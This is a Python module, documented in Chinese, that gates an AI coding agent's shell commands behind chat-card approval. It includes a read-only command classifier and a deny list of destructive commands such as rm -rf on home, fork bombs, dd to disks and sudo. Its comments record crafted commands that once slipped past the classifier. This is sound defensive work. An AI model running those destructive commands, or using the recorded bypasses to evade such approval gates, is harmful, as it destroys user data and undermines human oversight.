"""聊天里点按钮批准危险操作。

## 机制（2026-11-03 实测验证过，不是从文档推的）

Claude Code 的 `PreToolUse` 钩子支持 `permissionDecision: "defer"`：

```
第一次跑  → 钩子返回 defer → 进程以 stop_reason="tool_deferred" 退出
                             ↓ 命令没执行（实测：目标文件没被创建）
         我们把审批卡发到飞书，等人点
                             ↓
人点同意  → 写下批准记录 → claude --resume <session_id>
                             ↓ 钩子这次返回 allow
                           命令真的执行了（实测：文件写出来了）
```

这比"挂着一个子进程等人十分钟"好得多 —— 进程退出了，不占资源、不会超时，
人什么时候点都行。和调研里那条教训一致：两分钟以上的等待要用「停下 + 稍后继续」，
不要靠放大超时。

## 为什么钩子要落盘而不是走内存

钩子是 Claude Code 另起的**独立进程**，和我们的服务不共享内存。所以批准状态必须
落在文件系统上。每个 scope 一个目录，按"工具+输入"的指纹命名。

## 避开的那个真实故障

调研里有个开源项目把按钮回调令牌绑在"运行中的那次任务"上。但 agent 发完卡片这一轮
就结束了 ⇒ **每一张 agent 发出的审批卡，点下去必定失败**，而且没有任何用户可见反馈。
唯一能用的是 Stop 按钮，因为它只在跑的过程中点，所以这个 bug 很久没被发现。

所以这里的令牌只绑**内容**（scope + 动作指纹 + 一次性 nonce + 过期时间），
不绑任务生命周期 —— 见 review.py 的 ApprovalStore。
"""

from __future__ import annotations

import hashlib
import json
import logging
import os
import re
import time

from .osenv import hook_command

logger = logging.getLogger("feishu-bridge.approval")

# 钩子脚本。装机时写到用户目录，由 Claude Code 在每次用工具前调用。
#
# 注意它必须**自包含**：只用标准库，不 import 我们的代码（它在另一个进程里跑，
# 工作目录也不一定对）。
HOOK_SOURCE = r'''#!/usr/bin/env python3
"""CarHer 飞书助手的审批钩子。由 Claude Code 在用工具前调用，不要手动运行。

约定（和 bridge/approval.py 必须一致）：
  $CARHER_APPROVAL_DIR/<指纹>.ok        人批准了这一次操作
  $CARHER_APPROVAL_DIR/<指纹>.pending   已经发过卡片，别重复发
  $CARHER_APPROVAL_DIR/<指纹>.deny      卡挂着时他打了一句话 = 没批，这一步 deny 并把原话带给模型
"""
import hashlib
import json
import os
import re
import shlex
import sys
import time

# 批准的有效期。短得足够让「点了同意 → resume 接着做」这一步走完，
# 又不至于让一张没兑换的批准长期躺在磁盘上当通行证。
_GRANT_TTL_SEC = 600


READERS = frozenset({'ls', 'cat', 'head', 'tail', 'wc', 'file', 'du', 'df', 'echo', 'printf', 'pwd', 'basename', 'dirname', 'grep', 'egrep', 'fgrep', 'rg', 'sort', 'uniq', 'cut', 'tr', 'date', 'which', 'type', 'ps', 'uname', 'stat', 'realpath', 'readlink', 'sw_vers', 'true', 'false', 'test', '[', 'column', 'nl', 'rev', 'comm', 'diff', 'cmp', 'md5', 'shasum', 'jq', 'who', 'w', 'last', 'users', 'groups', 'vm_stat', 'ioreg', 'system_profiler', 'read', 'echo', 'sed', 'awk', 'cd', 'pushd', 'popd', 'dirs', 'command', 'builtin', 'set', 'shopt', 'printenv', 'locale', 'tty', 'groups', 'getconf', 'arch', 'sysctl', 'yq', 'tree', 'whoami', 'id', 'hostname', 'sleep', 'seq', 'expr', 'pgrep', 'vm_stat', 'sysctl', 'defaults', 'find', 'uptime', 'lsof', 'od', 'top', 'continue', 'break', 'return'})
_FORWARDERS = {'command': re.compile('(^|\\s)-[pVv]*[Vv][pVv]*(\\s|$)'), 'builtin': None}
_HANGS_WITHOUT_FLAG = {'top': re.compile('(^|\\s)-l\\s*0*[1-9]\\d*|(^|\\s)(-h|--help)\\b'), 'nettop': re.compile('(^|\\s)-l\\s*0*[1-9]\\d*|(^|\\s)(-h|--help)\\b'), 'traceroute': re.compile('(?!)'), 'traceroute6': re.compile('(?!)')}
_LOG_BOUNDED = re.compile('(^|\\s)(--last\\b|--start\\b|--end\\b|--predicate\\b|--process\\b|--archive\\b)')
_LOG_PAGER = re.compile('(^|\\s)--pager(\\s|$)')
_LOG_NEVER_BOUNDED = frozenset({'stream', 'stats'})
_PMSET_STREAMING_GETTERS = frozenset({'pslog', 'rawlog', 'assertionslog', 'uuidlog', 'sysloadlog', 'thermlog', 'powerstatelog'})
_POLL_INTERVAL_HANGS = {'vm_stat': re.compile('(^|\\s)\\d+(\\s|$)'), 'netstat': re.compile('(^|\\s)(-w\\s*\\d+|\\d+)(\\s|$)')}
_TMUX_FORMAT_RUNS_SHELL = re.compile('#\\(')
GIT_SAFE = frozenset({'status', 'log', 'diff', 'show', 'rev-parse', 'describe', 'ls-files', 'ls-tree', 'blame', 'shortlog', 'cat-file', 'symbolic-ref', 'count-objects', 'whatchanged', 'rev-list', 'name-rev', 'merge-base', 'for-each-ref', 'branch', 'tag', 'remote', 'diff-tree', 'diff-index', 'check-ignore', 'var', 'config'})
_GIT_CONFIG_READ_ONLY = re.compile('(^|\\s)(--get\\b|--get-all\\b|--get-regexp\\b|--get-urlmatch\\b|--get-color\\b|--get-colorbool\\b|--list\\b|-l\\b|list(?=\\s|$)|get(?=\\s|$))')
_GIT_CONFIG_WRITE = re.compile('(^|\\s)(--add\\b|--replace-all\\b|--unset\\b|--unset-all\\b|--edit\\b|-e\\b|--rename-section\\b|--remove-section\\b|(?:set|unset|rename-section|remove-section|edit)(?=\\s|$))')
_GIT_UNSAFE_FLAGS = re.compile('(^|\\s)(--delete\\b|--move\\b|--force\\b|--edit\\b|--output[=\\s]|--unset\\b|(?:set-url|set-head|set-branches|add|remove|rename|prune|rm)(?=\\s|$))')
_GIT_SHORT_FLAG_WRITERS = frozenset({'branch', 'tag', 'remote', 'symbolic-ref'})
_GIT_UNSAFE_SHORT_FLAGS = re.compile('(^|\\s)-[dDmMef]\\b')
_GIT_DANGEROUS_GLOBAL = re.compile('(^|\\s)(-c\\s|--exec-path|--config-env)')
_GIT_CREATE_BY_POSITIONAL = frozenset({'tag', 'branch', 'remote'})
_GIT_LIST_FLAGS = re.compile('(^|\\s)(-l\\b|--list\\b|--contains\\b|--merged\\b|--no-merged\\b|--points-at\\b|--sort[=\\s]|-a\\b|--all\\b|-r\\b|--remotes\\b|-v\\b)')
SUBCOMMAND_GATED = {'git': GIT_SAFE, 'defaults': frozenset({'read', 'read-type', 'domains', 'find'}), 'launchctl': frozenset({'list', 'print', 'print-disabled', 'dumpstate'}), 'brew': frozenset({'list', 'info', '--version', 'config', 'outdated', 'deps'}), 'npm': frozenset({'ls', 'list', 'view', 'info', 'outdated', '--version'}), 'kubectl': frozenset({'get', 'describe', 'logs', 'top', 'version', 'explain'}), 'docker': frozenset({'ps', 'images', 'logs', 'inspect', 'version', 'info'}), 'tmux': frozenset({'capture-pane', 'list-sessions', 'list-panes', 'list-windows', 'list-clients', 'list-buffers', 'list-keys', 'list-commands', 'display-message', 'show-options', 'show-environment', 'show-messages', 'info', 'has-session', 'ls', 'lsp', 'lsw', 'showw', 'show'}), 'log': frozenset({'show', 'stream', 'stats', 'help'}), 'pip': frozenset({'list', 'show', 'freeze', '--version', '-V', 'check', 'config'}), 'pip3': frozenset({'list', 'show', 'freeze', '--version', '-V', 'check', 'config'})}
_READONLY_FLAG_ONLY = {'pmset': {'flags': {'-g'}, 'values': set(), 'max_args': 1}, 'screen': {'flags': {'-ls', '-list'}, 'values': set(), 'max_args': 0}, 'crontab': {'flags': {'-l'}, 'values': set(), 'max_args': 0}, 'softwareupdate': {'flags': {'--list', '-l', '--list-full-installers'}, 'values': set(), 'max_args': 0}, 'networksetup': {'flags': None, 'allow_re': re.compile('^-get[a-zA-Z]+$'), 'values': set(), 'max_args': 2}, 'scutil': {'flags': None, 'allow_re': re.compile('^(--get|--dns|--proxy|--nwi|--nc)$'), 'values': {'--get'}, 'arg_re': re.compile('^(list|status)$'), 'max_args': 1}, 'ifconfig': {'flags': None, 'allow_re': re.compile('^-[aLmruv]+$'), 'values': set(), 'arg_re': re.compile('^[a-z]+[0-9]+$'), 'max_args': 1}, 'ping': {'flags': None, 'allow_re': re.compile('^-[cnqv]$'), 'values': {'-c'}, 'need': re.compile('(^|\\s)-c\\s+[1-9]'), 'arg_re': re.compile('^[A-Za-z0-9.:-]+$'), 'max_args': 1}, 'nettop': {'flags': None, 'allow_re': re.compile('^-[lLnmkPxtJ]$'), 'values': {'-l', '-m', '-k', '-t', '-J'}, 'need': re.compile('(^|\\s)-l\\s+[1-9]'), 'max_args': 0}, 'printenv': {'flags': set(), 'values': set(), 'arg_re': re.compile('^(?!.*(?i:KEY|TOKEN|SECRET|PASSWORD|PASSWD|CREDENTIAL|AUTH))[A-Za-z_][A-Za-z0-9_]*$'), 'max_args': 1}, 'arp': {'flags': None, 'allow_re': re.compile('^-[aniL]+$'), 'deny_re': re.compile('^-[a-zA-Z]*([dsSf])[a-zA-Z]*$'), 'values': {'-i'}, 'arg_re': re.compile('^[A-Za-z0-9._:-]+$'), 'max_args': 1}, 'netstat': {'flags': None, 'allow_re': re.compile('^-[acdefghiIlmnpqrRsStuvwW0-9.]*$'), 'deny_re': re.compile('^-[a-zA-Z]*d[a-zA-Z]*$'), 'values': {'-I', '-p', '-f'}, 'max_args': 1}}
_SEPARATORS = frozenset({';', '&&', '||', '|', '&', '\n', '\r', 'do', 'then', '{', '('})
_PUNCTUATION_ONLY = re.compile('^[();|&<>]+$|^;;$')
_STRUCTURE = frozenset({'done', 'fi', 'esac', '}', ')', '!', '[[', ']]', 'time', 'else', 'elif', 'in', ';;', '(', '|'})
_LOOP_HEADS = frozenset({'for', 'while', 'until', 'select'})
_EXPRESSION_COMMANDS = frozenset({'find'})
_OPTS_WITH_VALUE_BY_CMD = {'git': frozenset({'-C', '-c', '--git-dir', '--work-tree', '--exec-path'}), 'find': frozenset({'-name', '-iname', '-path', '-type', '-maxdepth', '-mindepth', '-newer', '-size', '-perm', '-user'}), 'grep': frozenset({'-e', '-f', '--include', '--exclude', '-m', '-A', '-B', '-C'}), 'rg': frozenset({'-e', '-g', '--glob', '-t', '-m', '-A', '-B', '-C'}), 'sed': frozenset({'-e', '-f'}), 'awk': frozenset({'-F', '-v', '-f'})}
_OPTS_WITH_VALUE_DEFAULT = frozenset({'--file', '--output', '-o'})
_HARMLESS_ASSIGNMENT = re.compile('^IFS=$')
_DANGEROUS_ENV = re.compile('^(PATH|IFS|SHELL|BASH_ENV|ENV|CDPATH|FPATH|LD_[A-Z_]*|DYLD_[A-Z_]*|PYTHON[A-Z_]*|NODE_[A-Z_]*|GIT_(?:SSH|EXTERNAL_DIFF|PAGER|EDITOR|CONFIG[A-Z_]*|DIR|EXEC_PATH)[A-Z_]*|PERL5[A-Z_]*|RUBYOPT|GEM_[A-Z_]*)$')
_REDIRECT = re.compile('>')
_HARMLESS_REDIRECT = re.compile('\\d*>&\\d+|\\d*>\\s*/dev/null\\b')
_SUBSTITUTION = re.compile('\\$\\(|`|<\\(')
_INNER_SUBSTITUTION = re.compile('\\$\\(([^()]*)\\)|`([^`]*)`')

def _command_heads(tokens: list[str]) -> list[tuple[str, int]] | None:
    """逐段取出「首个命令词」及其位置。返回 None 表示「判不出，走审批」。

    跳过 `for VAR in LIST` 的变量和列表 —— 原来的版本把循环变量 `d` 当成了
    命令名，导致 `for d in */; do echo $d; done` 被判成「不认识的命令：d」。
    """
    heads: list[tuple[str, int]] = []
    expect_command = True
    current = ''
    i = 0
    while i < len(tokens):
        token = tokens[i]
        if current in _EXPRESSION_COMMANDS and token in ('(', ')', '!'):
            i += 1
            continue
        if token in ('for', 'select'):
            j = i + 1
            while j < len(tokens) and tokens[j] not in ('do', ';'):
                j += 1
            i = j
            expect_command = True
            continue
        if token in ('while', 'until'):
            i += 1
            expect_command = True
            continue
        if token == 'case':
            j = i + 1
            while j < len(tokens) and tokens[j] != 'in':
                j += 1
            i = j + 1
            expect_command = True
            continue
        if token == 'if':
            i += 1
            expect_command = True
            continue
        if token in _SEPARATORS or _PUNCTUATION_ONLY.match(token):
            expect_command = True
            current = ''
            i += 1
            continue
        if token in _STRUCTURE:
            i += 1
            continue
        if expect_command and token.endswith(')') and (len(token) > 1):
            i += 1
            continue
        if expect_command:
            head = token.split('/')[0]
            if '=' in head[:32] and (not token.startswith('-')):
                name = token.split('=', 1)[0]
                if _DANGEROUS_ENV.match(name) and (not _HARMLESS_ASSIGNMENT.match(token)):
                    return None
                i += 1
                continue
            heads.append((token, i))
            current = token.rsplit('/', 1)[-1]
            expect_command = False
        i += 1
    return heads

def _segment(tokens: list[str], start: int) -> list[str]:
    """取「这一段」的 token：从命令词开始，到下一个分隔符/结构词为止。

    🔴 所有按选项判的门（`_WRITE_FLAG_GATED`、`_SED_UNSAFE`、`_GIT_UNSAFE_FLAGS` …）
    原来都拿**整条命令文本**去 search，于是别的段的选项会污染前一段的判定。
    实测（2026-11-03）全是纯只读却被判要问的：

      | 命令 | 被判成 | 污染源 |
      |---|---|---|
      | `git log --oneline \\| grep -e feat` | git log 带了会改东西的选项 | `grep -e` |
      | `git status --short; ls -d */` | 同上 | `ls -d` |
      | `git status \\| tr -d ' '` | 同上 | `tr -d` |
      | `grep -i todo -r . \\| sed 's/:.*//'` | sed 带了 -i | `grep -i` |
      | `ls -i \\| sed -n 1p` | 同上 | `ls -i` |
      | `ls -o \\| sort -n` | sort 带了会写文件的选项 | `ls -o` |
      | `cat a \\| shasum \\| head -c 8` | shasum 带了会写文件的选项 | `head -c` |
      | `date; ls foo` | date 带了参数，可能是在设置 | `ls` 的 `foo` |

    `grep -i` / `ls -d` / `tr -d` / `head -c` 都是 agent 的最高频写法，所以这一条
    正好砸在最常见的管道上。按段判之后每个门只看自己那一段。

    🔴 `find` 的 `\\( … \\)` 要留在同一段里。`(` 在 `_SEPARATORS` 里，不特判的话
    `find . \\( -name a \\) -delete` 的段只到 `find .` 为止 ⇒ `-delete` 落在段外、
    `_FIND_UNSAFE` 看不到它 ⇒ **放行一个删文件的命令**（我自己改括号时踩的，
    靠这条测试抓回来）。
    """
    base = (tokens[start] if start < len(tokens) else '').rsplit('/', 1)[-1]
    expression = base in _EXPRESSION_COMMANDS
    out: list[str] = []
    i = start
    while i < len(tokens):
        token = tokens[i]
        if expression and token in ('(', ')', '!'):
            out.append(token)
            i += 1
            continue
        if token in _SEPARATORS or token in _STRUCTURE or _PUNCTUATION_ONLY.match(token):
            break
        out.append(token)
        i += 1
    return out

def _segment_text(tokens: list[str], start: int) -> str:
    """把一段 token 拼回文本，给那些写成正则的选项门用。

    拼回来的文本和原文不是逐字节相同（引号被 shlex 摘掉了），但各个门要找的
    都是 `-i` / `-o` / `set-url` 这类**选项形状**，对空白不敏感。
    用 `shlex.join` 会把 `-i` 原样留着、把带空格的参数重新加引号，
    所以 `sed 's/a/b/'` 这种不会被误读成带选项。
    """
    return ' '.join(tokens[start:start + len(_segment(tokens, start))])

def _first_argument(tokens: list[str], start: int) -> str | None:
    """取某个命令后的第一个非选项参数（用于看子命令）。

    `git -C /path status` 要跳过 `-C` 和它的值 —— 带值选项按命令区分
    （见 `_OPTS_WITH_VALUE_BY_CMD` 的红字）。
    """
    base = (tokens[start] if start < len(tokens) else '').rsplit('/', 1)[-1]
    value_opts = _OPTS_WITH_VALUE_BY_CMD.get(base, _OPTS_WITH_VALUE_DEFAULT)
    i = start + 1
    while i < len(tokens):
        token = tokens[i]
        if token in _SEPARATORS or token in _STRUCTURE or _PUNCTUATION_ONLY.match(token):
            return None
        if token in value_opts:
            i += 2
            continue
        if token.startswith('-'):
            i += 1
            continue
        return token
    return None

def _positionals(tokens: list[str], start: int) -> list[str]:
    """取这一段里的位置参数（跳过选项**和带值选项的值**）。

    🔴 不扣掉 `-C` 的值就会把目录名当成要创建的名字：实测
    `git -C webapp branch --show-current` 被判成「git branch 带了名字，是在创建」
    而弹卡，同一条去掉 `-C webapp` 就放行。

    🔴 但带值选项要**按命令区分**：`-c` 对 git 带值、对 `uniq` 不带值。
    用一张全局表会把 `uniq -c a b` 的 `a` 吃掉 ⇒ 只剩一个位置参数 ⇒
    漏判成只读，而 `b` 是输出文件（实测能真写）。

    🔴 而且 git 的 `-C`/`-c` **只在子命令之前**是带值的全局选项。
    子命令之后它们是子命令自己的开关：`git branch -C <新名>` / `-c <新名>`
    是「复制分支」，实测 `git branch -C copiedbranch` 真建出了分支。
    无条件跳值就会把那个新名字当成 `-C` 的值吃掉 ⇒ 位置参数只剩子命令本身
    ⇒ 放行一个写操作（我自己改 `-C` 时引入的洞，靠
    `test_git_dash_c_after_subcommand_is_branch_copy_not_a_value_option` 抓回来）。
    所以**收到第一个位置参数之后就不再跳值**。
    """
    base = (tokens[start] if start < len(tokens) else '').rsplit('/', 1)[-1]
    value_opts = _OPTS_WITH_VALUE_BY_CMD.get(base, _OPTS_WITH_VALUE_DEFAULT)
    subcommand_scoped = base == 'git'
    out: list[str] = []
    i = start + 1
    while i < len(tokens):
        token = tokens[i]
        if token in _SEPARATORS or token in _STRUCTURE or _PUNCTUATION_ONLY.match(token):
            break
        if token in value_opts and (not (subcommand_scoped and out)):
            i += 2
            continue
        if token.startswith('-'):
            i += 1
            continue
        out.append(token)
        i += 1
    return out
_WRITE_FLAG_GATED = {'sort': re.compile('(^|\\s)(-o|--output)[=\\s]'), 'file': re.compile('(^|\\s)-C\\b'), 'shasum': re.compile('(^|\\s)(-c|--check)\\b'), 'yq': re.compile('(^|\\s)(-i|--inplace)\\b'), 'jq': re.compile('(^|\\s)(-i|--in-place)\\b'), 'sysctl': re.compile('(^|\\s)-w\\b'), 'lsof': re.compile('(^|\\s)-[abhlnNoOPRtUvVX?]*D')}
_QUERY_ONLY_WHEN_BARE = frozenset({'date', 'hostname', 'sw_vers', 'id', 'whoami', 'uname'})
_VERSION_ONLY = frozenset({'node', 'python', 'python3', 'ruby', 'perl', 'php', 'deno', 'bun', 'go', 'cargo', 'rustc', 'java', 'javac', 'swift', 'clang', 'gcc', 'pnpm', 'yarn', 'claude'})
_VERSION_SUBCOMMANDS = frozenset({'version'})
_PURE_QUERY_FLAGS = frozenset({'--version', '-v', '-V', '--help', '-h', '--usage'})
_POSITIONAL_WRITERS = frozenset({'uniq', 'tee'})
_SED_UNSAFE = re.compile('(^|\\s)(-i|--in-place)\\b|(^|\\s)-\\w*i\\w*\\b(?=\\s|$)')
_AWK_UNSAFE = re.compile('(print\\w*\\s*>|system\\s*\\(|\\|\\s*[\\"\']?(sh|bash)\\b|>>?\\s*[\\"\'])')
_FIND_UNSAFE = re.compile('-(delete|exec|execdir|ok|okdir|fls|fprint|fprintf|fprint0)\\b')
_FIND_WRITE_ONLY = re.compile('-(delete|fls|fprint|fprintf|fprint0)\\b')
_FIND_EXEC = re.compile('-(exec|execdir|ok|okdir)\\b')
_EXEC_FORBIDDEN_HEADS = _POSITIONAL_WRITERS | frozenset({'xargs', 'command', 'builtin', 'env', 'nice', 'nohup', 'time', 'timeout', 'stdbuf', 'setsid', 'script', 'watch'})
_XARGS_OPTS_WITH_VALUE = frozenset({'-n', '-P', '-L', '-s', '-I', '-E', '-J'})
_XARGS_UNSAFE_OPTS = re.compile('(^|\\s)(-I|-i\\b|--replace)')

def _find_exec_payloads(tokens: list[str], start: int) -> list[list[str]] | None:
    """抽出 `find … -exec CMD args {} ;` 里的每一段 CMD。

    返回 None 表示"结构看不懂" ⇒ 调用方当判不出处理（走审批）。
    """
    seg = _segment(tokens, start)
    payloads: list[list[str]] = []
    i = 0
    while i < len(seg):
        if seg[i] not in ('-exec', '-execdir', '-ok', '-okdir'):
            i += 1
            continue
        i += 1
        body: list[str] = []
        while i < len(seg) and seg[i] not in (';', '+'):
            if seg[i] != '{}':
                body.append(seg[i])
            i += 1
        if i >= len(seg):
            return None
        i += 1
        if not body:
            return None
        payloads.append(body)
    return payloads
_ANSI_C_QUOTE = re.compile("\\$'")

def _strip_comment(line: str) -> str:
    """剥掉**命令位置**的行尾注释，引号里的 `#` 不碰。

    不能用 `re.sub(r"(^|\\s)#.*$", …)`：它不认引号，`grep '# TODO' f` 的模式
    会被当成注释剥掉（那条命令整段消失 ⇒ 后面的段落错位）。也不能交给 shlex 的
    `commenters`：它在**词中间**也当注释，而 shell 不是（`echo a#b` 打出 `a#b`）。

    判据：从左往右扫，记住当前在不在单/双引号里；只有**引号外、且前面是行首或
    没被转义的空白**的 `#` 才是注释起点。反斜杠转义的下一个字符一律跳过。

    🔴 「前面是空白」要看那个空白**有没有被转义**，不能只看 `line[i-1].isspace()`。
    实测 `echo a\\ #b ; rm -rf DIR`：bash 眼里 `\\ ` 是转义空格 ⇒ `a #b` 是**一个词**、
    `#` 不是注释 ⇒ 分号是真分隔符、DIR 真被删。只看前一个字符是不是空白的话，
    会把它当注释、把后半条命令吃掉 ⇒ 判成只读（差分测试 `bash` 当裁判抓到的）。
    """
    in_single = in_double = False
    at_word_start = True
    i = 0
    while i < len(line):
        ch = line[i]
        if ch == '\\' and (not in_single):
            i += 2
            at_word_start = False
            continue
        if ch == "'" and (not in_double):
            in_single = not in_single
            at_word_start = False
        elif ch == '"' and (not in_single):
            in_double = not in_double
            at_word_start = False
        elif ch == '#' and (not in_single) and (not in_double) and at_word_start:
            return line[:i]
        elif ch.isspace() and (not in_single) and (not in_double):
            at_word_start = True
        else:
            at_word_start = False
        i += 1
    return line

def _classify_readonly(command: str) -> bool:
    """判这条命令是不是纯只读。判不出就返回 readonly=False（保守）。"""
    text = (command or '').strip()
    if not text:
        return False
    inner_commands = [grp for pair in _INNER_SUBSTITUTION.findall(text) for grp in pair if grp]
    if inner_commands:
        if text.count('`') > 2 or _SUBSTITUTION.search(''.join(inner_commands)):
            return False
        for inner in inner_commands:
            inner_verdict = _classify_readonly(inner)
            if not inner_verdict:
                return False
        text = _INNER_SUBSTITUTION.sub('X', text)
    if _SUBSTITUTION.search(text):
        return False
    if _ANSI_C_QUOTE.search(text):
        return False
    cleaned = _HARMLESS_REDIRECT.sub(' ', text)
    lines = []
    for line in re.split('[\\n\\r]+', cleaned):
        stripped = _strip_comment(line)
        if stripped.strip():
            lines.append(stripped)
    try:
        lexer = shlex.shlex(' ; '.join(lines), posix=True, punctuation_chars=True)
        lexer.whitespace_split = True
        lexer.commenters = ''
        tokens = list(lexer)
    except ValueError as exc:
        return False
    if any((token in ('>', '>>', '>|') for token in tokens)):
        return False
    if '<' in tokens:
        rebuilt: list[str] = []
        k = 0
        while k < len(tokens):
            if tokens[k] == '<' and k + 1 < len(tokens) and (not _PUNCTUATION_ONLY.match(tokens[k + 1])) and (tokens[k + 1] not in _SEPARATORS):
                end = len(rebuilt)
                rebuilt.append(tokens[k + 1])
                k += 2
                continue
            rebuilt.append(tokens[k])
            k += 1
        tokens = rebuilt
    if not tokens:
        return False
    heads = _command_heads(tokens)
    if heads is None:
        return False
    if not heads:
        return True
    for head, position in heads:
        if '/' in head:
            return False
        base = head
        seg = _segment_text(tokens, position)
        if base == 'xargs':
            if _XARGS_UNSAFE_OPTS.search(seg):
                return False
            rest = _segment(tokens, position + 1)
            i = 0
            while i < len(rest):
                token = rest[i]
                if not token.startswith('-'):
                    break
                i += 2 if token in _XARGS_OPTS_WITH_VALUE else 1
            payload = rest[i:]
            if not payload:
                continue
            if payload[0].rsplit('/', 1)[-1] in _EXEC_FORBIDDEN_HEADS:
                return False
            inner = _classify_readonly(' '.join((shlex.quote(t) for t in payload)))
            if not inner:
                return False
            continue
        if base in _FORWARDERS:
            print_only = _FORWARDERS[base]
            if print_only is not None and print_only.search(seg):
                continue
            rest = _segment(tokens, position + 1)
            while rest and rest[0].startswith('-'):
                rest = rest[1:]
            forwarded = rest
            if not forwarded:
                return False
            inner = _classify_readonly(' '.join((shlex.quote(t) for t in forwarded)))
            if not inner:
                return False
            continue
        if base == 'sed':
            if _SED_UNSAFE.search(seg):
                return False
            continue
        if base == 'awk':
            if _AWK_UNSAFE.search(seg):
                return False
            continue
        if base == 'find':
            if _FIND_WRITE_ONLY.search(seg):
                return False
            if _FIND_EXEC.search(seg):
                payloads = _find_exec_payloads(tokens, position)
                if payloads is None:
                    return False
                for body in payloads:
                    if body[0].rsplit('/', 1)[-1] in _EXEC_FORBIDDEN_HEADS:
                        return False
                    inner = _classify_readonly(' '.join((shlex.quote(t) for t in body)))
                    if not inner:
                        return False
                continue
            if _FIND_UNSAFE.search(seg):
                return False
            continue
        if base == 'git':
            if _GIT_DANGEROUS_GLOBAL.search(seg):
                return False
            rest = _segment(tokens, position + 1)
            if rest and all((tok in _PURE_QUERY_FLAGS for tok in rest)):
                continue
            sub = _first_argument(tokens, position)
            if sub is None:
                return False
            if sub not in GIT_SAFE:
                return False
            if sub == 'config':
                if _GIT_CONFIG_WRITE.search(seg):
                    return False
                if not _GIT_CONFIG_READ_ONLY.search(seg):
                    return False
                continue
            if sub == 'symbolic-ref':
                if len(_positionals(tokens, position)) > 2:
                    return False
            if _GIT_UNSAFE_FLAGS.search(seg):
                return False
            if sub in _GIT_SHORT_FLAG_WRITERS and _GIT_UNSAFE_SHORT_FLAGS.search(seg):
                return False
            if sub in _GIT_CREATE_BY_POSITIONAL and (not _GIT_LIST_FLAGS.search(seg)):
                if len(_positionals(tokens, position)) > 1:
                    return False
            continue
        poll_gate = _POLL_INTERVAL_HANGS.get(base)
        if poll_gate is not None and poll_gate.search(seg):
            return False
        spec = _READONLY_FLAG_ONLY.get(base)
        if spec is not None:
            why = _flag_only_ok(tokens, position, spec)
            if why:
                return False
            if base == 'pmset':
                getter = _positionals(tokens, position)
                if getter and getter[0] in _PMSET_STREAMING_GETTERS:
                    return False
            continue
        gated = SUBCOMMAND_GATED.get(base)
        if gated is not None:
            rest = _segment(tokens, position + 1)
            if rest and all((tok in _PURE_QUERY_FLAGS for tok in rest)):
                continue
            sub = _first_argument(tokens, position)
            if sub is None:
                return False
            if sub not in gated:
                return False
            if base == 'tmux' and _TMUX_FORMAT_RUNS_SHELL.search(seg):
                return False
            if base == 'tmux' and sub == 'capture-pane' and (not re.search('(^|\\s)-[a-zA-Z]*p[a-zA-Z]*(\\s|$)', seg)):
                return False
            if base == 'log':
                if sub in _LOG_NEVER_BOUNDED:
                    return False
                if _LOG_PAGER.search(seg):
                    return False
                if sub == 'show' and (not _LOG_BOUNDED.search(seg)):
                    return False
            if base in ('pip', 'pip3') and sub == 'config':
                second = _positionals(tokens, position)
                if len(second) < 2 or second[1] not in ('list', 'get', 'debug'):
                    return False
            continue
        if base in _VERSION_ONLY:
            rest = _segment(tokens, position + 1)
            if rest and all((tok in _PURE_QUERY_FLAGS for tok in rest)):
                continue
            if rest and len(rest) == 1 and (rest[0] in _VERSION_SUBCOMMANDS):
                continue
            return False
        if base in _QUERY_ONLY_WHEN_BARE:
            if _positionals(tokens, position):
                return False
            continue
        flag_gate = _WRITE_FLAG_GATED.get(base)
        if flag_gate is not None and flag_gate.search(seg):
            return False
        if base in _POSITIONAL_WRITERS:
            if len(_positionals(tokens, position)) > 1:
                return False
        hang_gate = _HANGS_WITHOUT_FLAG.get(base)
        if hang_gate is not None and (not hang_gate.search(seg)):
            return False
        if base not in READERS:
            return False
    return True
_HOME_OR_ROOT = '[\\"\']?(?:~|\\$HOME|\\$\\{HOME\\}|/Users/[^/\\s\\"\';&|]+|/home/[^/\\s\\"\';&|]+|/Users|/home|/)(?:/\\.?|/\\*|\\*)?[\\"\']?(?![^\\s;&|]*/[^\\s;&|])'
_DESTROY_HOME_IN_CODE = re.compile('(?:rmtree|rm_rf|rmSync|unlinkSync|removeAll)[^\\n]{0,120}(?:expanduser|homedir|\\bHOME\\b|USERPROFILE|~)|(?:expanduser|homedir|\\bHOME\\b|USERPROFILE)[^\\n]{0,120}(?:rmtree|rm_rf|rmSync|unlinkSync|removeAll)', re.I)
_NEVER_APPROVABLE = ((_DESTROY_HOME_IN_CODE, '代码里在删家目录'), (re.compile('\\brm\\b(?=(?:[^;&|]*\\s(?:-[a-zA-Z]*[rR]|--recursive)))(?=(?:[^;&|]*\\s(?:-[a-zA-Z]*f|--force)))[^;&|]*\\s' + _HOME_OR_ROOT + '(?=\\s|$|;|&|\\|)'), '递归删除根目录或家目录'), (re.compile('\\bfind\\s+' + _HOME_OR_ROOT + '(?=\\s)[^;&|]*\\s-(?:delete\\b|exec(?:dir)?\\s+rm\\b|ok(?:dir)?\\s+rm\\b)'), '把根目录或家目录整个删掉'), (re.compile('\\bgit\\s+push\\b'), '把代码推到远端'), (re.compile('\\bsudo\\b|\\bdoas\\b'), '提权'), (re.compile('\\bdd\\b.*\\bof=/dev/'), '裸写磁盘'), (re.compile(':\\(\\)\\s*\\{.*\\}\\s*;?\\s*:'), 'fork 炸弹'), (re.compile('\\bkubectl\\s+delete\\b|\\bhelm\\s+(delete|uninstall)\\b'), '删线上资源'), (re.compile('\\bchmod\\s+-R\\s+777\\b|\\bchown\\s+-R\\b.*\\s/\\s*$'), '递归改权限'), (re.compile('\\bdiskutil\\s+(erase|reformat)|\\bmkfs\\b'), '格式化磁盘'), (re.compile('\\blaunchctl\\s+(bootout|unload)\\b.*\\bcom\\.apple\\b'), '卸载系统服务'))

def _flag_only_ok(tokens: list, start: int, spec: dict) -> str:
    """这一段是不是**只有**被认可的只读 token。返回空串 = 是；否则返回要问的原因。

    见 `_READONLY_FLAG_ONLY` 的红字：判据是「整段白名单」，不是「出现过某个选项」。
    """
    seg = _segment(tokens, start)[1:]
    allow = spec.get('flags')
    allow_re = spec.get('allow_re')
    deny_re = spec.get('deny_re')
    values = spec.get('values') or set()
    args = 0
    saw_flag = False
    i = 0
    while i < len(seg):
        tok = seg[i]
        if tok.startswith('-') and tok != '-':
            name = tok.split('=', 1)[0]
            if deny_re is not None and deny_re.match(name):
                return '带了会改东西的选项'
            ok = allow is not None and name in allow or (allow_re is not None and bool(allow_re.match(name)))
            if not ok:
                return '带了不认识的选项，可能是在改设置'
            saw_flag = True
            i += 2 if name in values and '=' not in tok else 1
            continue
